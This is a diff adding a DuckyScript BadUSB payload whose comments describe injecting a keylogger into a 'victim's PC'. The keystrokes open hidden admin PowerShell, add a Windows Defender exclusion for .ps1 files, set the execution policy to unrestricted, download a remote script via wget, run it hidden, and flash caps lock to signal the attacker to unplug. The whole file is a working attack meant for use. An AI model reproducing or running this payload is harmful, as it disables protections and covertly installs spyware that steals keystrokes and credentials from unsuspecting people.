@@ -1,0 +1,50 @@
+REM This script allows you to inject a software keylogger in victim's PC
+LOCALE FR
+DELAY 2500
+REM Minimize all app
+GUI d
+DELAY 500
+REM Start powershell as admin
+GUI r
+DELAY 500
+STRING powershell.exe -windowstyle hidden
+DELAY 200
+CTRL SHIFT ENTER
+DELAY 2000
+LEFT
+DELAY 150
+ENTER
+DELAY 2000
+REM Go to public documents directory
+STRING cd C:\Users\Public\Documents
+ENTER
+REM Add an exception for .ps1 files in antivirus
+STRING Add-MpPreference -ExclusionExtension ps1 -Force
+ENTER
+REM Disable script blocker
+STRING Set-ExecutionPolicy unrestricted -Force
+ENTER
+REM Download ps1 script
+STRING wget LINK -OutFile ciaoV2.ps1
+ENTER
+DELAY 3500
+REM Start ps1 script
+STRING powershell.exe -noexit -windowstyle hidden -file ciaoV2.ps1
+ENTER
+REM Make capslock flash to know when you can unplug the BadUSB
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 2000
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+REM End of payload
